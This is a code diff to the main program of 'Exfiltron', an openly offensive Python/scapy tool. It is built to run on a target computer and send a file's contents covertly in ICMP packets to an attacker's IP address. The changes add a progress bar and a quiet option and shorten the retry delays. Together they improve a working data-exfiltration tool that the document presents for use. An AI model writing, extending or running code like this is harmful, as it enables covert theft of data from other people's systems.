@@ -7,12 +7,15 @@ Purpose: This is the main running program for the Exfiltron framework. This
         placed on the target computer to exfiltrate data from.
 """
 
+############################## Import statements ##############################
 
 import argparse     # For parsing command line arguments
 import logging      # Get rid of that pesky scapy IPv6 warning
 import sys          # If unexpected results occur, stop usage (and call your doctor)
 import time         # For getting some sleep in between packets
 import os           # Make sure the user is root
+
+############################## Ensure Runability ##############################
 
 # Is scapy installed? Are you running python 2.7?
 try:
@@ -30,12 +33,16 @@ if(os.getuid() is not 0):
     print("Exiting...")
     sys.exit()
 
+############################ Constants/Definitions ############################
+
 RETRY = 3           # The number of times to resend an unanswered packet
 TIMEOUT = 2.5       # Timeout = 2.5*amount_of_time_to_wait_between_each_packet
-FIVE_SEC = 5
+ONE_SEC = 1
 SIX_HOURS = 21600   # Six hours in terms of seconds
 FOURTY_EIGHT_HOURS = 172800     # Fourty-eight hours in terms of seconds
+PROGRESS_BAR_SIZE = 20          # Number of blocks in the progress bar
 
+################################## Functions ##################################
 
 def setArgParserOptions():
     """
@@ -90,21 +97,38 @@ def setArgParserOptions():
                         ' Use this option to specify a different amount in' +
                         ' terms of seconds', default=5)
 
+    # Add option to silence progress bar
+    parser.add_argument('-q', '--quiet', action='store_false', help="By " +
+                        "default, a progress bar is shown displaying the " +
+                        "amounts of packets sent out of the total number " +
+                        "of packets that need to be sent. Specifying this " +
+                        "option silences all output relating to the progress" +
+                        " bar", default=True)
+
     return parser.parse_args()
 
 
-def send(packets, amountOfTime, destIP):
+def send(packets, amountOfTime, destIP, displayProgress):
     """
     Purpose: This function sends out all the packets created by the
             user-specified module
     @param (List) a list of packets created by scapy to send to the destIP
     @param (int) the amount of time to wait before sending another packet
+    @param (String) destIP - The IP of the attacker (you!)
+    @param (bool) displayProgress - tells us whether or not to display progress
     @return (NoneType) None
     """
+
+    numPackets = len(packets)
+    count = 0
 
     # TODO: Make progress bar
     # Send each packet in the list
     for packet in packets:
+
+        # Print the progress bar
+        if(displayProgress):
+            progressBar(count, numPackets)
 
         # first_offense allows us to resend the packet twice more before waiting
         # 6 hours to retry
@@ -117,8 +141,8 @@ def send(packets, amountOfTime, destIP):
             # Try twice more for a response if no response was found
             while(first_offense < 2 and response is None):
 
-                # Wait for 5 seconds before sending the next one
-                time.sleep(FIVE_SEC)
+                # Wait for 1 second before sending the next one
+                time.sleep(ONE_SEC)
 
                 response = sr1(packet, retry=RETRY, timeout=TIMEOUT*amountOfTime,
                            filter="host " + destIP + " and icmp", verbose=False)
@@ -139,6 +163,32 @@ def send(packets, amountOfTime, destIP):
         # Wait for the specified amount of time before sending another packet
         time.sleep(amountOfTime)
 
+        # Increment progress counter
+        if(displayProgress):
+            count += 1
+
+    if(displayProgress):
+        progressBar(count, numPackets)
+        print('')
+
+def progressBar(progress, total):
+    """
+    Purpose: Prints out the progress bar
+    @param (int) progress - number of things that have been done
+    @param (int) total - number of things to do
+    @return (Nonetype) None
+    """
+
+    # Determine number of blocks
+    totalProgress = progress/float(total)
+    numBlocks = int(round(PROGRESS_BAR_SIZE*totalProgress))
+    progressString = ("[" + "#"*numBlocks + "-"*(PROGRESS_BAR_SIZE-numBlocks) +
+            "] " + str(int(round(100*totalProgress))) + "%")
+
+    sys.stdout.write(progressString)
+    sys.stdout.flush()
+    sys.stdout.write('\r')
+
 def main():
     # Parse the commands from the command line with argparser
     args = setArgParserOptions()
@@ -153,7 +203,7 @@ def main():
             sys.exit()
 
         send(icmp.icmp(args.dest_ip, args.file_name, args.data_per_packet),
-             args.time, args.dest_ip)
+             args.time, args.dest_ip, args.quiet)
 
 
 if (__name__ == '__main__'):
